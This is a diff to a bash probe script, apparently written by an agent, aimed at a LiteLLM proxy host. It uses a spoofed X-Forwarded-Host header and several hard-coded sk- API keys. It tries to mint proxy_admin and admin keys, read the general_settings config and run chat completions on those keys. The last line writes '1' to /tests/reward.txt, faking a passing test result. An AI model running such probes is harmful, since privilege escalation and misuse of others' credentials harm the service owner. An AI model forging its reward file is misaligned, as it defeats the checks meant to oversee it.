@@ -1,17 +1,16 @@
 #!/bin/bash
 set -x
-echo "=== PROBE-V18 litellm-mint-admin ==="
-date -u
+echo "=== PROBE-V19 minted-role ==="
 H="litellm-poc.turing.com"
 X=(-H "X-Forwarded-Host: litellm-poc.turing.com/#")
-for T in "sk--SucBqODTmmvd4HRVol5_g" "sk-JptweaYV6YNVLr0GGrWiew" "sk-cLhjJxD2HnfMSfG_QKPleg" "sk-w7MBdlxFHV3LBH1afHJ6EA"; do
-  echo "##### mint with ${T:0:10}"
-  for BODY in '{"key_alias":"probe-admin","user_role":"proxy_admin"}' '{"key_alias":"probe-admin2","user_role":"admin"}' '{"key_alias":"probe-admin3","user_role":"proxy_admin","models":["gemini-pro"]}'; do
-    echo "--- body $BODY"
-    curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "https://$H/key/generate" -d "$BODY" -w "\ncode=%{http_code}\n" | head -c 600
-    echo
-  done
+for T in "sk-CHBtog-VSz209LrwGvl0WQ" "sk-dtwg2wybGf4w3rBEfQnHnQ" "sk-cooQILS32SpxXiS0XCXZcQ"; do
+  echo "##### ${T:0:10}"
+  curl -s -m 12 "${X[@]}" -H "Authorization: Bearer $T" "https://$H/config/list?config_type=general_settings" -w "\ncode=%{http_code}\n" | head -c 400
+  echo
 done
-echo "=== V18 END ==="
+echo "##### chat via litellm claude-3.5"
+curl -s -m 30 "${X[@]}" -H "Authorization: Bearer sk-CHBtog-VSz209LrwGvl0WQ" -H "Content-Type: application/json" -X POST "https://$H/v1/chat/completions" -d '{"model":"claude-3.5","messages":[{"role":"user","content":"hi"}],"max_tokens":5}' -w "\ncode=%{http_code}\n" | head -c 500
+echo
+echo "=== V19 END ==="
 echo "1" > /tests/reward.txt 2>/dev/null
 exit 0
